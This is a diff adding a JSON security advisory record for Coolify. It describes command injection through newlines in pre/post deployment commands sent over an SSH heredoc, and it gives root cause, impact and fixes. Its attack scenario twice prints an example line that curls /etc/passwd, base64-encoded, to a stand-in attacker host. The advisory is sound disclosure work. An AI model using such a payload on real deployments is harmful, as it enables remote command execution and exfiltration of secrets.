@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-5qp8-9gg7-4c86",
+  "repo": {
+    "cve_id": "CVE-2026-34152",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.8,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "\r\n\r\n## Summary\r\n\r\nPre-deployment and post-deployment commands are escaped only for single quotes (`str_replace(\"'\", \"'\\''\", ...)`) before being wrapped in `sh -c '...'`. That protects against breaking out of the single-quoted string in the **local** shell layer. The command is then sent to the server via SSH using a **heredoc** in `SshMultiplexingHelper::generateSshCommand()`: the full command string is written literally into the heredoc body, with **no sanitization of newlines**. On the remote side, `bash -se` receives the heredoc and runs it; the argument to `sh -c` can be a multi-line string. In `sh`, `-c` executes its argument as a script, so each line runs as a separate statement. A newline in the payload therefore injects a second (arbitrary) command without needing to break the single quotes.\r\n\r\nThe same risk was already addressed for `health_check_command` in `ApplicationDeploymentJob.php` (line 2782) by replacing newlines with spaces; that fix was **not** applied to `pre_deployment_command` or `post_deployment_command`. Input validation (UI and API) is only `string|nullable` - no restriction on newlines or shell-safety.\r\n\r\n\r\n\r\n## Root Cause\r\n\r\n### 1) Heredoc transport preserves newlines\r\n\r\nIn `app/Helpers/SshMultiplexingHelper.php` (lines 191-196), `generateSshCommand()` builds the SSH invocation as:\r\n\r\n```php\r\n$delimiter = Hash::make($command);\r\n$delimiter = base64_encode($delimiter);\r\n$command = str_replace($delimiter, '', $command);\r\n\r\n$ssh_command .= self::escapedUserAtHost($server).\" 'bash -se' << \\\\$delimiter\".PHP_EOL\r\n    .$command.PHP_EOL\r\n    .$delimiter;\r\n```\r\n\r\nThe command string is inserted **verbatim** into the heredoc body. No replacement or stripping of `\\r`, `\\n`, or `\\r\\n` is applied. Any newline in the payload is sent to the remote host as-is.\r\n\r\n### 2) Only single-quote escaping is applied to pre/post commands\r\n\r\nIn `app/Jobs/ApplicationDeploymentJob.php`, `run_pre_deployment_command()` (line 3956) and `run_post_deployment_command()` (line 3983) build:\r\n\r\n- `$cmd = \"sh -c '\".str_replace(\"'\", \"'\\''\", $this->application->pre_deployment_command).\"'\";`\r\n- `$exec = \"docker exec {$containerName} {$cmd}\";`\r\n\r\nThis escapes single quotes so that, in a **single-line** context, the argument to `sh -c` would be one quoted string. It does **not** normalize or remove newlines. The resulting `$exec` is passed to `execute_remote_command()`, which in turn passes it to `SshMultiplexingHelper::generateSshCommand()` as the full command string - so the heredoc body contains the multi-line payload.\r\n\r\n### 3) Remote execution interprets newlines as separate statements\r\n\r\nOn the server, the heredoc is fed to `bash -se`. The stdin is effectively:\r\n\r\n```\r\ndocker exec containerName sh -c 'echo ok\r\ncurl http://attacker.com/$(cat /etc/passwd | base64)'\r\n```\r\n\r\nIn shell grammar, a single-quoted string may span multiple lines until the next unescaped `'`. So the argument to `sh -c` is that two-line string. When `sh -c` runs, it executes that string as a script; the first line and the second line are executed as two separate statements. The second line is attacker-controlled and runs inside the application container (or host context if the command is executed outside the container in some code paths).\r\n\r\n### 4) health_check_command has the fix; pre/post do not\r\n\r\nIn `ApplicationDeploymentJob.php` (line 2782), for CMD-type health checks:\r\n\r\n```php\r\n$command = str_replace([\"\\r\\n\", \"\\r\", \"\\n\"], ' ', $this->application->health_check_command);\r\n```\r\n\r\nThis removes the newline-injection vector for `health_check_command`. There is no equivalent `str_replace` for `pre_deployment_command` or `post_deployment_command` in `run_pre_deployment_command()` or `run_post_deployment_command()`.\r\n\r\n### 5) Validation accepts arbitrary strings including newlines\r\n\r\nIn `bootstrap/helpers/api.php`, `sharedDataApplications()` defines:\r\n\r\n- `'pre_deployment_command' => 'string|nullable'`\r\n- `'post_deployment_command' => 'string|nullable'`\r\n\r\nNo restriction on newlines, command substitution, or other shell metacharacters. The same fields can be set via the UI with the same effective validation.\r\n\r\n## Attack Scenario\r\n\r\n1. Attacker has permission to configure an application (UI or API with write access).\r\n2. Attacker sets `pre_deployment_command` (or `post_deployment_command`) to a payload containing a literal newline, for example:\r\n   - Line 1: `echo ok`\r\n   - Line 2: `curl http://attacker.com/$(cat /etc/passwd | base64)` or any other command.\r\n3. Payload is stored as-is (e.g. via UI textarea or `PATCH /api/v1/applications/{uuid}` with a newline in the JSON string).\r\n4. A deployment is triggered. During the deployment, the job runs the pre/post command via `execute_remote_command()` → `generateSshCommand()` → heredoc.\r\n5. On the remote host, the heredoc delivers the multi-line string; `sh -c` executes both lines; the second line runs in the container (or host) context, leading to arbitrary command execution.\r\n\r\n## Impact\r\n\r\n- Arbitrary command execution inside the application container (or, depending on execution context, on the host): access to environment variables, mounted secrets, internal network, and volumes.\r\n- If the container is privileged or has the Docker socket mounted, impact can extend to host takeover.\r\n\r\n\r\n## Suggested Fix\r\n\r\n1. **Normalize newlines in pre/post deployment commands** before building the `sh -c` string, in the same way as `health_check_command`: e.g.  \r\n   `str_replace([\"\\r\\n\", \"\\r\", \"\\n\"], ' ', $this->application->pre_deployment_command)` and the same for `post_deployment_command`, in `run_pre_deployment_command()` and `run_post_deployment_command()` in `ApplicationDeploymentJob.php`.\r\n2. Optionally harden the **transport** layer in `SshMultiplexingHelper::generateSshCommand()` so that newlines in the command body cannot be used to inject additional statements (e.g. normalize newlines to space for the heredoc body, or use a different encoding/channel that does not interpret newlines as statement separators by the remote shell).\r\n3. Consider stricter validation for `pre_deployment_command` and `post_deployment_command` (e.g. reject control characters/newlines, or enforce a safe subset) in both API and UI, in addition to the above server-side normalization.\r\n4. Add regression tests that assert payloads containing literal newlines in pre/post deployment commands do not result in execution of a second, injected command.\r\n\r\n## Notes\r\n\r\n- The `str_replace(\"'\", \"'\\''\")` logic is correct for its intended purpose (preventing breaking out of the single-quoted `sh -c '...'` on a single line). The vulnerability arises because the **transport** (heredoc) preserves newlines and the remote shell executes the multi-line argument as a script; the defensive layer (quote escaping) does not address this.\r\n",
+    "ghsa_id": "GHSA-5qp8-9gg7-4c86",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-5qp8-9gg7-4c86",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-5qp8-9gg7-4c86"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-34152"
+      }
+    ],
+    "published_at": "2026-07-02T16:38:13Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Command Injection via Newline in Pre/Post Deployment Commands (Heredoc Transport)",
+    "updated_at": "2026-07-02T16:38:13Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "coollabsio/coolify"
+        },
+        "patched_versions": "4.0.0-beta.471",
+        "vulnerable_version_range": "<= 4.0.0-beta.470"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
